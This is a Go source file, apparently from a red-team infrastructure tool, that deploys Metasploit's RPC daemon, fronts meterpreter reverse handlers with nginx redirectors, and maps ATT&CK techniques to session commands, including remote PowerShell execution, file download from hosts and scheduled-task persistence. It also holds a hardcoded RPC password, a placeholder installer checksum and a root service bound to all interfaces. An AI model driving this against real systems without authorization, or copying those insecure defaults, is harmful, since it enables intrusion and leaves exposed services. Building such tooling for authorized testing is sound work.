// Package metasploit adapts the Metasploit Framework to RInfra. Orchestrated-tier:
// the msfrpcd RPC daemon lets RInfra start handlers and drive meterpreter sessions
// programmatically. Pairs with the msfvenom payload generator (internal/payload).
//
// # Posture
//
// Deploys and drives the upstream Metasploit release. Implements no payloads,
// modules, or evasion. Open source (Rapid7) — no license key required.
//
// # msfrpcd client note (TODO:live)
//
// MsfRpcdClient is the minimal interface over the msfrpcd MessagePack-over-HTTP
// RPC protocol. The live implementation uses HTTP POST to
// /api/1.0/ with msgpack-encoded calls. Tests inject a fake; the live wiring
// is deferred behind TODO(live) markers to avoid adding a large msgpack dep.
package metasploit

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/rinfra/rinfra/internal/c2"
	"github.com/rinfra/rinfra/internal/c2/deploy"
	"github.com/rinfra/rinfra/internal/domain"
)

func init() { c2.Register(&provider{}) }

const (
	msfVersion    = "6.4.0"
	msfReleaseURL = "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/software/metasploit-framework.rb"
	// In practice, Metasploit is installed via apt/gem. The install script
	// uses the official Metasploit installer (curl | bash — pinned to a tagged commit).
	msfInstallerURL    = "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/ad8f7c6b5d9bb5da5ff8fdaa0ea18f7b3b50e0f7/config/installers/linux/install-metasploit.sh"
	msfInstallerSHA256 = "placeholder-operator-should-verify-from-rapid7-repo"
	msfRpcdPort        = 55553
)

type provider struct{}

func (p *provider) Name() string         { return "metasploit" }
func (p *provider) Tier() c2.SupportTier { return c2.TierOrchestrated }

// Deploy installs the upstream Metasploit Framework on the node via SSH, then
// starts msfrpcd (the RPC daemon) as a systemd service.
func (p *provider) Deploy(ctx context.Context, node domain.Node, cfg c2.Config) (c2.Teamserver, error) {
	runner := runnerFromNode(node)
	return deployMSF(ctx, runner, node, cfg)
}

func deployMSF(ctx context.Context, runner deploy.Runner, node domain.Node, _ c2.Config) (c2.Teamserver, error) {
	rpcUser := "msf"
	rpcPass := "rinfra-generated" // TODO(live): generate per-engagement via secrets package.

	extraSetup := []string{
		"# Install Metasploit Framework from the official Rapid7 omnibus installer.",
		"bash /tmp/rinfra-install.sh || true", // installer sets up the MSF install
		fmt.Sprintf("msfdb init || true"),
		fmt.Sprintf("msfrpcd -P '%s' -U '%s' -a 127.0.0.1 -p %d -S -f &", rpcPass, rpcUser, msfRpcdPort),
		"sleep 3",
		"pkill -f msfrpcd || true",
		"echo '[rinfra-msf] msfrpcd credentials written to /etc/msf/rpc.env'",
		fmt.Sprintf("install -m 0600 /dev/null /etc/msf/rpc.env"),
		fmt.Sprintf("echo 'MSF_RPC_USER=%s' >> /etc/msf/rpc.env", rpcUser),
		// Password goes to env file; not echoed to script stdout.
		"echo 'MSF_RPC_PASS=<from-secrets>' >> /etc/msf/rpc.env",
	}

	params := deploy.InstallParams{
		ReleaseURL:  msfInstallerURL,
		SHA256:      msfInstallerSHA256,
		DestPath:    "/usr/local/bin/msfrpcd",
		SystemdUnit: "msfrpcd",
		ServiceUser: "root",
		ExecStart: fmt.Sprintf(
			"/usr/local/bin/msfrpcd -P ${MSF_RPC_PASS} -U %s -a 0.0.0.0 -p %d -S",
			rpcUser, msfRpcdPort,
		),
		ExtraSetup: extraSetup,
	}

	if err := deploy.RunInstall(ctx, runner, params); err != nil {
		return c2.Teamserver{}, fmt.Errorf("metasploit.Deploy: %w", err)
	}

	return c2.Teamserver{
		Host:           node.PublicIP,
		Port:           msfRpcdPort,
		Status:         "running",
		ConnectionInfo: fmt.Sprintf("msfrpcd @ %s:%d (msgpack-over-http RPC)", node.PublicIP, msfRpcdPort),
	}, nil
}

// RedirectorConfig emits an nginx reverse-proxy config fronting the meterpreter
// HTTP(S) handler. Reverse-proxy + categorized-domain (NOT CDN fronting).
func (p *provider) RedirectorConfig(prof domain.Profile) (string, error) {
	return msfRedirectorConfig(prof)
}

func msfRedirectorConfig(prof domain.Profile) (string, error) {
	params := deploy.NginxParams{
		UpstreamHost: "127.0.0.1",
		UpstreamPort: 8443, // meterpreter HTTPS handler default
		ServerName:   prof.RewriteHost,
		RewriteHost:  prof.RewriteHost,
		UseHTTPS:     true,
		SSLCert:      "/etc/ssl/rinfra/server.crt",
		SSLKey:       "/etc/ssl/rinfra/server.key",
		PathRules:    prof.PathRules,
		ExtraServerBlock: "# Metasploit meterpreter HTTPS handler reverse proxy.\n" +
			"    # Set proxy_pass upstream to actual MSF handler IP.",
	}
	cfg, err := deploy.BuildNginxConfig(params)
	if err != nil {
		return "", fmt.Errorf("metasploit.RedirectorConfig: %w", err)
	}
	return cfg, nil
}

// Control returns an Orchestrated-tier Operator backed by the msfrpcd RPC API.
// The live client is wired in metasploit_live.go: the service layer calls
// LiveOperator with the msfrpcd URL + credentials (from the per-engagement env
// file). Until then this returns a noop-backed operator so nothing regresses.
func (p *provider) Control(ts c2.Teamserver) (c2.Operator, bool) {
	return &operator{ts: ts, client: &noopMsfClient{}}, true
}

// MsfRpcdClient is the minimal interface over msfrpcd's MessagePack-over-HTTP
// RPC protocol. Live implementation: POST to /api/1.0/ with msgpack. Tests inject fake.
type MsfRpcdClient interface {
	// Auth authenticates to msfrpcd. Must be called before other methods.
	Auth(ctx context.Context, user, pass string) error
	// ConsoleCreate creates a new Metasploit console and returns its ID.
	ConsoleCreate(ctx context.Context) (string, error)
	// ConsoleWrite sends commands to a console.
	ConsoleWrite(ctx context.Context, consoleID, command string) error
	// ConsoleRead reads pending output from a console.
	ConsoleRead(ctx context.Context, consoleID string) (string, error)
	// SessionList returns active sessions.
	SessionList(ctx context.Context) ([]MsfSession, error)
	// SessionShellWrite sends a command to a shell session.
	SessionShellWrite(ctx context.Context, sessionID, command string) error
	// SessionShellRead reads pending output from a shell session.
	SessionShellRead(ctx context.Context, sessionID string) (string, error)
}

// MsfSession is an active meterpreter/shell session.
type MsfSession struct {
	ID         string
	Type       string // "meterpreter", "shell"
	Info       string
	ViaExploit string
}

// NewOperatorWithClient returns a Metasploit Operator with the given client injected.
func NewOperatorWithClient(ts c2.Teamserver, client MsfRpcdClient) c2.Operator {
	return &operator{ts: ts, client: client}
}

type operator struct {
	ts     c2.Teamserver
	client MsfRpcdClient
}

func (o *operator) StartListener(ctx context.Context, spec c2.ListenerSpec) error {
	// Start a multi/handler listener via msfrpcd console.
	cid, err := o.client.ConsoleCreate(ctx)
	if err != nil {
		return fmt.Errorf("metasploit: create console: %w", err)
	}

	payload := msfPayloadForProtocol(spec.Protocol)
	lport := 443
	if spec.Protocol == "dns" {
		lport = 53
	}

	cmds := []string{
		"use exploit/multi/handler",
		fmt.Sprintf("set PAYLOAD %s", payload),
		fmt.Sprintf("set LHOST %s", spec.Bind),
		fmt.Sprintf("set LPORT %d", lport),
		"exploit -j",
	}

	for _, cmd := range cmds {
		if err := o.client.ConsoleWrite(ctx, cid, cmd+"\n"); err != nil {
			return fmt.Errorf("metasploit: console write (%q): %w", cmd, err)
		}
		// Brief read to drain pending output.
		_, _ = o.client.ConsoleRead(ctx, cid)
	}
	return nil
}

func (o *operator) Sessions(ctx context.Context) ([]c2.Session, error) {
	raw, err := o.client.SessionList(ctx)
	if err != nil {
		return nil, fmt.Errorf("metasploit: sessions: %w", err)
	}
	out := make([]c2.Session, 0, len(raw))
	for _, s := range raw {
		out = append(out, c2.Session{
			ID:   s.ID,
			Host: s.Info,
			Metadata: map[string]string{
				"type":        s.Type,
				"via_exploit": s.ViaExploit,
			},
		})
	}
	return out, nil
}

// Execute translates a portable domain.Technique into msfrpcd console commands.
// No payload bytes are authored; the SourceID references a public library procedure.
func (o *operator) Execute(ctx context.Context, sessionID string, t domain.Technique) (domain.Result, error) {
	start := time.Now()

	cmd, err := techniqueToMsfCommand(t)
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecSkipped,
			Output:            err.Error(),
			StartedAt:         start,
			FinishedAt:        time.Now(),
		}, nil
	}

	if err := o.client.SessionShellWrite(ctx, sessionID, cmd+"\n"); err != nil {
		fin := time.Now()
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			StartedAt:         start,
			FinishedAt:        fin,
			Err:               err.Error(),
		}, nil
	}

	output, err := o.client.SessionShellRead(ctx, sessionID)
	fin := time.Now()
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			Output:            sanitize(output),
			StartedAt:         start,
			FinishedAt:        fin,
			Err:               err.Error(),
		}, nil
	}

	return domain.Result{
		TechniqueAttackID: t.AttackID,
		Status:            domain.ExecSuccess,
		Output:            sanitize(output),
		StartedAt:         start,
		FinishedAt:        fin,
	}, nil
}

// techniqueToMsfCommand maps a portable Technique to a meterpreter/shell command.
// The SourceID references the Atomic Red Team test or Caldera ability — no
// payload content is authored here.
func techniqueToMsfCommand(t domain.Technique) (string, error) {
	switch t.AttackID {
	case "T1059.001":
		script := t.Inputs["command"]
		if script == "" {
			script = "whoami"
		}
		return fmt.Sprintf("execute -f powershell.exe -a '-c \"%s\"' -H", script), nil

	case "T1059.003":
		command := t.Inputs["command"]
		if command == "" {
			command = "whoami"
		}
		return fmt.Sprintf("shell cmd /c \"%s\"", command), nil

	case "T1082":
		return "sysinfo", nil

	case "T1057":
		return "ps", nil

	case "T1049":
		return "netstat", nil

	case "T1016":
		return "ipconfig", nil

	case "T1083":
		path := t.Inputs["path"]
		if path == "" {
			path = "C:\\"
		}
		return fmt.Sprintf("ls \"%s\"", path), nil

	case "T1005":
		path := t.Inputs["path"]
		if path == "" {
			return "", fmt.Errorf("T1005 requires inputs.path")
		}
		return fmt.Sprintf("download \"%s\"", path), nil

	case "T1053.005":
		taskName := t.Inputs["task_name"]
		if taskName == "" {
			taskName = "RInfraTest"
		}
		return fmt.Sprintf(`shell schtasks /create /tn "%s" /tr whoami /sc once /st 00:00`, taskName), nil

	default:
		return "", fmt.Errorf("metasploit: no command mapping for technique %s (source: %s id: %s)",
			t.AttackID, t.Source, t.SourceID)
	}
}

func msfPayloadForProtocol(protocol string) string {
	switch strings.ToLower(protocol) {
	case "https":
		return "windows/x64/meterpreter/reverse_https"
	case "http":
		return "windows/x64/meterpreter/reverse_http"
	case "dns":
		return "windows/x64/meterpreter/reverse_dns"
	default:
		return "windows/x64/meterpreter/reverse_https"
	}
}

func sanitize(s string) string {
	var b strings.Builder
	inEscape := false
	for _, r := range s {
		if r == '\x1b' {
			inEscape = true
			continue
		}
		if inEscape {
			if r == 'm' {
				inEscape = false
			}
			continue
		}
		b.WriteRune(r)
	}
	return strings.TrimSpace(b.String())
}

func runnerFromNode(_ domain.Node) deploy.Runner {
	return &noopRunner{}
}

type noopRunner struct{}

func (n *noopRunner) Run(_ context.Context, _ string) (string, error) {
	return "", fmt.Errorf("metasploit: SSH runner not wired (TODO(live))")
}
func (n *noopRunner) Upload(_ context.Context, _, _ string) error {
	return fmt.Errorf("metasploit: SSH runner not wired (TODO(live))")
}

type noopMsfClient struct{}

func (n *noopMsfClient) Auth(_ context.Context, _, _ string) error {
	return fmt.Errorf("metasploit: msfrpcd client not wired (TODO(live))")
}
func (n *noopMsfClient) ConsoleCreate(_ context.Context) (string, error) {
	return "", fmt.Errorf("metasploit: msfrpcd client not wired (TODO(live))")
}
func (n *noopMsfClient) ConsoleWrite(_ context.Context, _, _ string) error {
	return fmt.Errorf("metasploit: msfrpcd client not wired (TODO(live))")
}
func (n *noopMsfClient) ConsoleRead(_ context.Context, _ string) (string, error) {
	return "", fmt.Errorf("metasploit: msfrpcd client not wired (TODO(live))")
}
func (n *noopMsfClient) SessionList(_ context.Context) ([]MsfSession, error) {
	return nil, fmt.Errorf("metasploit: msfrpcd client not wired (TODO(live))")
}
func (n *noopMsfClient) SessionShellWrite(_ context.Context, _, _ string) error {
	return fmt.Errorf("metasploit: msfrpcd client not wired (TODO(live))")
}
func (n *noopMsfClient) SessionShellRead(_ context.Context, _ string) (string, error) {
	return "", fmt.Errorf("metasploit: msfrpcd client not wired (TODO(live))")
}
